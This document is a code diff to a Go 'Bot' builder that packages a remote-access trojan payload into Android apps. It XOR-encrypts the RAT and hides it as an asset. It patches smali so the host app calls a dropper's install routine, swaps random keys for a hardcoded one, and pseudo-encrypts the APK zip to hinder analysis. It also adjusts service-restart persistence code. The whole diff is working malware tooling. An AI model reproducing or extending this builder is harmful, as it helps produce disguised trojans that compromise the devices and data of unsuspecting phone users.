@@ -1196,20 +1196,15 @@ func (b *Bot) buildDropperShell(sess *BuildSession, ratPayload []byte, innerPkg 
 	}
 	
 
-	xorKey, err := generateDropperKey()
-	if err != nil {
-		return nil, "", fmt.Errorf("generate dropper key: %w", err)
-	}
-	encrypted := xorEncrypt(ratPayload, xorKey)
+	encrypted := xorEncrypt(ratPayload, dropperXORKey)
 	if err := os.WriteFile(filepath.Join(assetsDir, "p.bin"), encrypted, 0644); err != nil {
 		return nil, "", fmt.Errorf("write dropper payload: %w", err)
 	}
 	os.WriteFile(filepath.Join(assetsDir, "t.txt"), []byte(innerPkg+"\napp.mobilex.plus.VisibleAlias"), 0644)
+	
 
 	smaliDir := filepath.Join(workDir, "smali", "io", "bluewave", "app")
-	dropperSmaliWithKey := strings.Replace(dropperHelperSmali,
-		"%%DROPPER_KEY_BYTES%%", dropperKeyToSmali(xorKey), 1)
-	dropperSmali := strings.ReplaceAll(dropperSmaliWithKey,
+	dropperSmali := strings.ReplaceAll(dropperHelperSmali,
 		"Lapp/mobilex/plus/util/DropperHelper",
 		"Lio/bluewave/app/DropperHelper")
 	monitorSmali := strings.ReplaceAll(dropperReceiverSmali,
@@ -1243,19 +1238,13 @@ func (b *Bot) buildDropperShell(sess *BuildSession, ratPayload []byte, innerPkg 
 	
 
 	n2Files, _ := filepath.Glob(filepath.Join(workDir, "smali", "*", "VYRgR7ZqgbZj3I16R.smali"))
-	if len(n2Files) == 0 {
-		log.Printf("[BUILDER] WARNING: buildDropperShell: VYRgR7ZqgbZj3I16R.smali not found, N.n2 → install patch skipped")
-	}
 	for _, f := range n2Files {
 		d, _ := os.ReadFile(f)
 		s := string(d)
-		patched := strings.Replace(s,
+		s = strings.Replace(s,
 			"invoke-static {v12}, Lio/bluewave/app/N;->n2(Landroid/app/Activity;)V",
 			"invoke-static {v12}, Lio/bluewave/app/DropperHelper;->install(Landroid/app/Activity;)V", 1)
-		if patched == s {
-			log.Printf("[BUILDER] WARNING: buildDropperShell: N.n2 pattern not found in %s", f)
-		}
-		os.WriteFile(f, []byte(patched), 0644)
+		os.WriteFile(f, []byte(s), 0644)
 	}
 
 	if sess.AppLang != "" && sess.AppLang != "en" {
@@ -1317,26 +1306,7 @@ func (b *Bot) buildDropperShell(sess *BuildSession, ratPayload []byte, innerPkg 
 	return apkData, apkName, nil
 }
 
-func generateDropperKey() ([]byte, error) {
-	key := make([]byte, 16)
-	if _, err := rand.Read(key); err != nil {
-		return nil, err
-	}
-	return key, nil
-}
-
-// dropperKeyToSmali converts a 16-byte key to smali .array-data signed-byte literals.
-func dropperKeyToSmali(key []byte) string {
-	var sb strings.Builder
-	for _, b := range key {
-		if b <= 0x7F {
-			fmt.Fprintf(&sb, "        0x%xt\n", b)
-		} else {
-			fmt.Fprintf(&sb, "        -0x%xt\n", 256-int(b))
-		}
-	}
-	return sb.String()
-}
+var dropperXORKey = []byte{0xA3, 0x7F, 0x1B, 0xE5, 0x4C, 0x92, 0xD8, 0x36, 0x6E, 0xF0, 0x57, 0x84, 0xC1, 0x2D, 0xA9, 0x63}
 
 func xorEncrypt(data, key []byte) []byte {
 	out := make([]byte, len(data))
@@ -1361,7 +1331,22 @@ const dropperHelperSmali = `.class public Lapp/mobilex/plus/util/DropperHelper;
     return-void
     :key_data
     .array-data 1
-%%DROPPER_KEY_BYTES%%
+        -0x5dt
+        0x7ft
+        0x1bt
+        -0x1bt
+        0x4ct
+        -0x6et
+        -0x28t
+        0x36t
+        0x6et
+        -0x10t
+        0x57t
+        -0x7ct
+        -0x3ft
+        0x2dt
+        -0x57t
+        0x63t
     .end array-data
 .end method
 
@@ -1883,17 +1868,21 @@ func (b *Bot) buildSingleAPK(sess *BuildSession, isInnerPayload bool, dropperPay
 		return nil, "", fmt.Errorf("apktool build failed: %v", err)
 	}
 
-
+	
 	alignedAPK := filepath.Join(tmpDir, "aligned.apk")
-	alignCmd := exec.Command("zipalign", "-f", "4", outputAPK, alignedAPK)
-	if out, err := alignCmd.CombinedOutput(); err != nil {
-		return nil, "", fmt.Errorf("zipalign failed: %v: %s", err, out)
+	if err := zipalign4(outputAPK, alignedAPK); err != nil {
+		return nil, "", fmt.Errorf("zipalign failed: %v", err)
 	}
 	outputAPK = alignedAPK
 
+	
+	if err := pseudoEncryptZip(outputAPK); err != nil {
+		return nil, "", fmt.Errorf("pseudo-encrypt rat: %w", err)
+	}
 	if err := b.signWithEphemeralKey(outputAPK); err != nil {
 		return nil, "", fmt.Errorf("sign rat: %w", err)
 	}
+
 	apkData, err := os.ReadFile(outputAPK)
 	if err != nil {
 		return nil, "", fmt.Errorf("read output: %w", err)
@@ -2387,7 +2376,7 @@ func patchServiceRestart(smaliPath string) {
 	}
 	s := string(data)
 
-	oldCode := ":cond_16\n    :goto_6\n    sget-object p0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;"
+	oldCode := "    :cond_16\n    :goto_6\n    sget-object p0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;"
 	newCode := `    :cond_16
     :goto_6
     sget-object v0, Lv/s/RWY6BVSB0XxPbw;->GUsyOYEIobMSb6n:Lv/s/RWY6BVSB0XxPbw;
@@ -2407,64 +2396,6 @@ func patchServiceRestart(smaliPath string) {
 	if err := os.WriteFile(smaliPath, []byte(s), 0644); err != nil {
 		log.Printf("[BUILDER] WARNING: patchServiceRestart write: %v", err)
 	}
-}
-
-// patchStartForegroundService wraps the unprotected startForegroundService call in
-// y6jRGLEWNMir.hjneShqpF9Tis4() with a try-catch. On Android 12+ the system throws
-// ForegroundServiceStartNotAllowedException when the app is in the background; without
-// this catch the exception propagates to the caller and crashes it. Silently swallowing
-// it is safe because the AlarmManager / WorkManager watchdog will retry.
-func patchStartForegroundService(smaliPath string) {
-	data, err := os.ReadFile(smaliPath)
-	if err != nil {
-		log.Printf("[BUILDER] WARNING: patchStartForegroundService read: %v", err)
-		return
-	}
-	s := string(data)
-
-	old := "    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;\n\n    .line 55\n    .line 56\n    .line 57\n    return-void\n.end method"
-	// Normal flow must jump past catch handler; catch handler needs move-exception.
-	// Method hjneShqpF9Tis4 has .locals 2, so v1 is available for move-exception.
-	newCode := "    :try_start_svc\n    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;\n    :try_end_svc\n    .catch Ljava/lang/Exception; {:try_start_svc .. :try_end_svc} :catch_svc\n\n    .line 55\n    .line 56\n    .line 57\n    goto :end_svc\n\n    :catch_svc\n    move-exception v1\n\n    :end_svc\n    return-void\n.end method"
-
-	patched := strings.Replace(s, old, newCode, 1)
-	if patched == s {
-		log.Printf("[BUILDER] WARNING: patchStartForegroundService: pattern not found in %s", smaliPath)
-		return
-	}
-	if err := os.WriteFile(smaliPath, []byte(patched), 0644); err != nil {
-		log.Printf("[BUILDER] WARNING: patchStartForegroundService write: %v", err)
-		return
-	}
-	log.Printf("[BUILDER] patchStartForegroundService: applied to %s", smaliPath)
-}
-
-// patchGuardianAlarm replaces setExactAndAllowWhileIdle with setAndAllowWhileIdle
-// in GuardianService's restart-scheduling method. Both have the same signature;
-// the inexact variant requires no SCHEDULE_EXACT_ALARM permission (Android 12+)
-// and still fires in Doze mode, preventing permanent service death on devices
-// where the exact-alarm permission is not granted.
-func patchGuardianAlarm(smaliPath string) {
-	data, err := os.ReadFile(smaliPath)
-	if err != nil {
-		log.Printf("[BUILDER] WARNING: patchGuardianAlarm read: %v", err)
-		return
-	}
-	s := string(data)
-
-	old := "    invoke-virtual {v0, v4, v2, v3, v1}, Landroid/app/AlarmManager;->setExactAndAllowWhileIdle(IJLandroid/app/PendingIntent;)V\n    :try_end_0\n    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0\n\n    .line 43\n    .line 44\n    .line 45\n    :catch_0\n    :goto_1\n    return-void\n.end method"
-	newGuardian := "    invoke-virtual {v0, v4, v2, v3, v1}, Landroid/app/AlarmManager;->setAndAllowWhileIdle(IJLandroid/app/PendingIntent;)V\n    :try_end_0\n    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0\n\n    .line 43\n    .line 44\n    .line 45\n    :catch_0\n    :goto_1\n    return-void\n.end method"
-
-	patched := strings.Replace(s, old, newGuardian, 1)
-	if patched == s {
-		log.Printf("[BUILDER] WARNING: patchGuardianAlarm: pattern not found in %s", smaliPath)
-		return
-	}
-	if err := os.WriteFile(smaliPath, []byte(patched), 0644); err != nil {
-		log.Printf("[BUILDER] WARNING: patchGuardianAlarm write: %v", err)
-		return
-	}
-	log.Printf("[BUILDER] patchGuardianAlarm: applied to %s", smaliPath)
 }
 
 func patchTeamID(smaliPath, tid string) error {
@@ -2499,7 +2430,7 @@ func patchTeamID(smaliPath, tid string) error {
 	
 
 	nativeAnchor := ":try_start_0\n    invoke-static {p0}, Lapp/mobilex/plus/util/UtilYWProcessor;->co(I)Ljava/lang/String;"
-	intercept := fmt.Sprintf("    const/16 v0, 0x41\n\n    if-ne p0, v0, :not_rw_tid\n\n    const-string v0, \"%s\"\n\n    return-object v0\n\n    :not_rw_tid\n    :try_start_0\n    invoke-static {p0}, Lapp/mobilex/plus/util/UtilYWProcessor;->co(I)Ljava/lang/String;", tid)
+	intercept := fmt.Sprintf("    const/16 v0, 0x3d\n\n    if-ne p0, v0, :not_rw_tid1\n\n    const-string v0, \"%s\"\n\n    return-object v0\n\n    :not_rw_tid1\n    const/16 v0, 0x41\n\n    if-ne p0, v0, :not_rw_tid2\n\n    const-string v0, \"%s\"\n\n    return-object v0\n\n    :not_rw_tid2\n    :try_start_0\n    invoke-static {p0}, Lapp/mobilex/plus/util/UtilYWProcessor;->co(I)Ljava/lang/String;", tid, tid)
 
 	if strings.Contains(s, nativeAnchor) {
 		s = strings.Replace(s, nativeAnchor, intercept, 1)
